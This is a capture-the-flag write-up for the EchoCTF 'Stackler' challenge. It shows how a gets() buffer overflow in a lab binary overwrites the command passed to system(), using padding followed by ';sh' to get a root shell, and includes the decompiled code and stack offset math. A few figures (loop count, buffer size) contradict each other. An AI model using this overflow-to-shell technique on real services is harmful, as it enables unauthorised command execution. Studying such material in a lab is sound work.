### Stackler EchoCTF

### Difficulty = Easy

### IP Address =  10.0.41.19

#### Description: This system generated a 20 character random word each time so guessing it is quite hard. Still there is a way to force your way around and get access to the flag that can be found on the same folder as the challenge. To start the challenge connect with nc -t 10.0.41.19 1337. Your timer starts from the first time you connect to the service.

We're given a netcat service to connect to 

```
nc -t 10.0.41.19 1337
```

On connecting to it shows an input prompt that required us giving it a password

```
└─$ nc -t 10.0.41.19 1337
Guess the word i'm thinking and you win a shell...
lol
FAILURE! You didnt guess my word...
My word was: 9Gw:>{)?vcIF|ud  
```

We can't guess a 20 random value so attempting to get the password isn't going to be a way here

From the box name called `stackler` so maybe it deals with stack overflow

But here's the problem. We are not given a binary to analyze so if i'm to perform a binary exploitation it will be kinda difficulty

Since the difficulty is Easy i'll assume that the binary already uses a vulnerable function maybe `gets(), strcpy, etc.` to receive our input

With this i made a script to fuzz for values and append ;sh

Here's the script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/stackler/exploit.py)

On running it after few minutes it pops a shell 

```
└─$ python3 fuzz.py       
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[----------------------SNIP---------------------------]
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[*] Switching to interactive mode
SUCCESS! Here is my gift to you...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
sh: 0: can't access tty; job control turned off
# $  
```

So what's likely happening there is that:

```
1. It saves a value in the stack
2. And it runs system(value)
3. With the exploit we made the A's overwrote what is stored in the value therefore making it system(;sh)
```

And we're root

```
[*] Switching to interactive mode
SUCCESS! Here is my gift to you...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
sh: 0: can't access tty; job control turned off
# $ id
uid=0(root) gid=0(root) groups=0(root)
# $ ls -al
total 764
drwxr-xr-x 1 root root   4096 Nov 16  2021 .
drwxr-xr-x 1 root root   4096 Feb 20 00:39 ..
-rw-r--r-- 1 root root      0 Nov 16  2021 ETSCTF_22138d61ca9a56b747753874141ff009
-rwxr-xr-x 1 root root 773088 Nov 16  2021 chall
# $ 
```

Just for learning sake lets analyze the binary

I downloaded it to my machine 

We see its a x64 binary which is statically meaning that the contents of that file are included at link time. In other words, the contents of the file are physically inserted into the executable (like syscall 🤔) also we see that just only Stack Canary and NX is enabled
![image](https://user-images.githubusercontent.com/113513376/219988107-fbb450a8-80e3-40c6-a04b-e3a7bea63994.png)

Now i will run the binary to get an overview of what it does of cause its the same thing the remote server will do 
![image](https://user-images.githubusercontent.com/113513376/219988265-2de6a60c-a5a5-46f1-869e-0ac7a9d1374b.png)

It asks us to guess the word and win a shell

I'll decompile the binary using ghidra. Because the binary is statically linked it will take some while for ghidra to analyze all the functions

Nevertheless lets get to view the decompiled code

Here's what i'll do first, search for strings in the binary
![image](https://user-images.githubusercontent.com/113513376/219988326-e03bec5b-beb0-4b83-851f-dbdb36042e52.png)
![image](https://user-images.githubusercontent.com/113513376/219988351-9ca0d895-fb4c-4f03-a1cf-4af1bad7c22d.png)

Now i'll just select a function of where any string is
![image](https://user-images.githubusercontent.com/113513376/219988456-858e5afe-eca3-4ab0-84a8-f2ded9e157fe.png)

From the decompiled code we see the main function also there's no stack canary in the binary i have no idea why checksec said there's stack canary present

Here's the decompiled code `Note: I renamed some variable names for easy understanding`

```
undefined8 main(void)

{
  int success;
  ulong rand;
  char input [32];
  undefined rand_word [32];
  char id [32];
  int value;
  int random2;
  int random1;
  int i;
  
  random1 = 0x21;
  random2 = 0x7d;
  thunk_FUN_004010d6(id,"/usr/bin/id",0x14);
  thunk_FUN_004010d6(rand_word,"ddddddddddddddd",0x14);
  for (i = 0; i < 14; i = i + 1) {
    rand = urandom();
    value = random1 + (int)(rand % (ulong)(long)((random2 - random1) + 1));
    rand_word[i] = (char)value;
  }
  puts("Guess the word i\'m thinking and you win a shell...");
  gets(input);
  success = thunk_FUN_004010d6(input,rand_word,0x14);
  if (success == 0) {
    puts("SUCCESS! Here is my gift to you...");
    system(id);
  }
  else {
    puts("FAILURE! You didnt guess my word...");
    printf("My word was: %s",rand_word);
  }
  return 0;
}
```

From the decompiled code we know that:

```
1. It does string copy of /usr/bin/id to variable id
2. It does string copy of ddddddddddddddd to variable rand_word
3. It loops for 9 times that does this `'!' + random % (('!' - '}') + 1) which is saved in value
4. Next the value the loop formed is saved in rand_word
5. It asks for our input and uses get to receive our input # bug here
6. It then does a string compare of our input to the value in rand_word
7. If the check is met it does system on variable id
8. Else it prints failed and the value stored in rand_word
```

So the generated random value isn't possible to be known cause there's no way for brute forcing it since each process it runs a new random value is created

The vulnerability that lays in the program is the usage of gets(). Using get doesn't check the amount of bytes passed in and we know that the value it receives is stored in an input buffer which can only hold up to 20 bytes of data

Therefore with gets() being used we can cause a buffer overflow

What can we do with this ?

From the code the value stored in id is later run with system

```
if (success == 0) {
    puts("SUCCESS! Here is my gift to you...");
    system(id);
  }
```

So if we can overwrite the value in id to bash we will get a shell

Firstly we need to get the offset between the input and the id variable

Here's the stack layout
![image](https://user-images.githubusercontent.com/113513376/219988942-08511149-4673-4bb2-9b3a-073a17b4a8b1.png)

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>                                XREF[2]:     00401ce8(W), 
                                                                                                   00401d5a(W)  
             undefined8        RAX:8          rand                                    XREF[2]:     00401ce8(W), 
                                                                                                   00401d5a(W)  
             undefined4        EAX:4          success                                 XREF[1]:     00401d5a(W)  
             undefined4        Stack[-0xc]:4  i                                       XREF[4]:     00401cda(W), 
                                                                                                   00401d19(R), 
                                                                                                   00401d22(RW), 
                                                                                                   00401d26(R)  
             undefined4        Stack[-0x10]:4 random1                                 XREF[3]:     00401ca0(W), 
                                                                                                   00401cf3(R), 
                                                                                                   00401d0c(R)  
             undefined4        Stack[-0x14]:4 random2                                 XREF[2]:     00401ca7(W), 
                                                                                                   00401cf0(R)  
             undefined4        Stack[-0x18]:4 value                                   XREF[2]:     00401d11(W), 
                                                                                                   00401d14(R)  
             undefined1[32]    Stack[-0x38]   id                                      XREF[2]:     00401cae(*), 
                                                                                                   00401d6d(*)  
             undefined1[32]    Stack[-0x58]   rand_word                               XREF[3]:     00401cc4(*), 
                                                                                                   00401d47(*), 
                                                                                                   00401d85(*)  
             undefined1[32]    Stack[-0x78]   input                                   XREF[2]:     00401d36(*), 
                                                                                                   00401d4b(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:00401afd(*), 
                                                                                          _start:00401afd(*), 0049a6c0(*)  
        00401c98 55              PUSH       RBP

```

Looking at the stack layout we see that:

```
1. The offset of start of input is 0x78
2. The offset of id variable is 0x38
```

Doing the math 0x78 - 0x38 = 0x40 we get the offset

That means that if we give it 0x40 bytes of data the value stored in id which is /usr/bin/id will be overwritten by our value which then system() will run the value stored in id

If we overwrite the value to sh we will get shell here's the local exploit
![image](https://user-images.githubusercontent.com/113513376/219989439-7102809c-0499-4822-873d-49c7e3542bf7.png)

Thats why our fuzz script worked cause after we overwrite the value stored in id, it was replaced with ;sh which gave us shell xD

And we're done 

<br> <br>
[Back To Home](../../index.md)
